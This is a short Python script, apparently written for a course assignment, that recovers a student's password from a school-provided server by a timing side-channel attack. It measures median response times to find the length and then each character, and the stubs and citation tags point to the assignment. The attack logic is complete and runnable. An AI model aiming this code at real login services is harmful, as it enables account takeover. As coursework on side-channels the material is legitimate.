import time
import string
import statistics

# --- PRE-EXISTING CODE FROM YOUR DOWNLOADED client.py ---
def client_connect():
    # ... (Keep the school's original code here) ...
    pass

def call_server(student_number, password):
    # ... (Keep the school's original code here) ...
    # Ensure this line remains as per assignment requirements:
    time.sleep(0.001) # [cite: 33, 34]
    pass

# --- PASTE THE ATTACK LOGIC BELOW ---

CHARSET = string.ascii_lowercase + string.digits # [cite: 52]

def get_stable_time(student_number, password):
    """
    To deal with Wi-Fi variance, we take many samples and use the MEDIAN.
    The median is much better than the average for Wi-Fi because it 
    ignores 'lag spikes' (outliers).
    """
    # INCREASE THIS for Wi-Fi: 50 is good, 100 is very stable but slower.
    SAMPLES = 100 
    
    times = []
    for _ in range(SAMPLES):
        start = time.perf_counter()
        call_server(student_number, password)
        end = time.perf_counter()
        
        times.append(end - start)
        
        # Mandatory sleep to avoid DDoS and keep the server stable [cite: 33, 34]
        time.sleep(0.001) 
    
    # Returning the median filters out random network interference 
    return statistics.median(times)

def crack_password(student_number):
    # 1. Determine Length [cite: 43, 44]
    best_length = 0
    max_delay = 0
    for length in range(1, 21):
        test_pw = "a" * length
        t = get_stable_time(student_number, test_pw)
        if t > max_delay:
            max_delay = t
            best_length = length
    
    # 2. Crack Character by Character [cite: 48, 51]
    current_pw = list("a" * best_length)
    for i in range(best_length):
        best_char = ""
        max_char_delay = 0
        for char in CHARSET:
            current_pw[i] = char
            t = get_stable_time(student_number, "".join(current_pw))
            if t > max_char_delay:
                max_char_delay = t
                best_char = char
        current_pw[i] = best_char
        print(f"Progress: {''.join(current_pw)}")
    
    print(f"Final Password: {''.join(current_pw)}")

# Run the attack
if __name__ == "__main__":
    # Test with the known student first [cite: 54, 80]
    crack_password("489720")